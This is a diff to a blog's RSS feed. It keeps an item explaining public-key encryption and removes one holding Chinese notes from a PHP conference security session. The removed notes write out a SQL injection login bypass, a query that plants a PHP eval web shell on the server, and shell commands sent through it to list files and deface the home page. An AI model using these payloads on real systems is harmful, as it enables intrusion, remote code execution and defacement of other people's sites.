@@ -5,38 +5,17 @@
     <link>/categories/security/</link>
     <description>Recent content in security on Software</description>
     <generator>Hugo -- gohugo.io</generator>
-    <language>en-us</language>
-    <lastBuildDate>Fri, 05 Dec 2014 11:52:58 +0800</lastBuildDate><atom:link href="/categories/security/index.xml" rel="self" type="application/rss+xml" />
+    <language>en-us</language><atom:link href="/categories/security/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>Encryption</title>
       <link>/posts/encryptionw/</link>
-      <pubDate>Fri, 05 Dec 2014 11:52:58 +0800</pubDate>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/posts/encryptionw/</guid>
       <description>Asymmetric cryptography (public-key cryptography) It contains a pair of Public key and Private key.
 Public key
 The public key is openly shared and accessible to anyone. It can be used by anyone to encrypt data intended for the recipient who holds the corresponding private key. The public key can also be used to verify digital signatures created by the corresponding private key holder. Private key
 The private key is kept secret by its owner and should never be shared with anyone.</description>
-    </item>
-    
-    <item>
-      <title>2013 PHPConf</title>
-      <link>/posts/phpconf-hack/</link>
-      <pubDate>Fri, 01 Nov 2013 23:03:00 +0000</pubDate>
-      
-      <guid>/posts/phpconf-hack/</guid>
-      <description>&amp;ldquo;矛盾大對決&amp;quot;是 PHPConf 的第一場 , 很不錯的開場, 而且也補足我一些防駭的觀念
-一邊防守, 一邊攻擊及解說, 實在太讚了!
-SQl Injection show.php?id=1 + &#39;
-= show.php?id=1&#39;
-如果有錯誤代表沒有做過濾 補充 : sql injection 也可以直接在密碼地方輸入 &#39; or &amp;quot;1&amp;quot;=&amp;quot;1&amp;quot; -- 來測試它是否有漏洞 寫後門改首頁 show.php?id=20 into outfile &#39;/var/www/.a.php&#39; lines terminated by &#39;&amp;lt;?php eval($_POSST[cmd];?&amp;gt;&#39;
-在 /var/www 建立一個 PHP 的後門 前提是 apache 要有對資料夾執行寫檔的權限
-改首頁囉 !
-對 http://XXXX.XXX/.a.php POST, cmd的值為 :
-檢視資料清單
-echo `ls -alh` ` 包起來代表 php 會去執行 linux command
-改首頁
-echo `echo Hack by Orange &amp;gt; index.php` 使用 union 污染 sql 結果 這邊不太懂</description>
     </item>
     
   </channel>
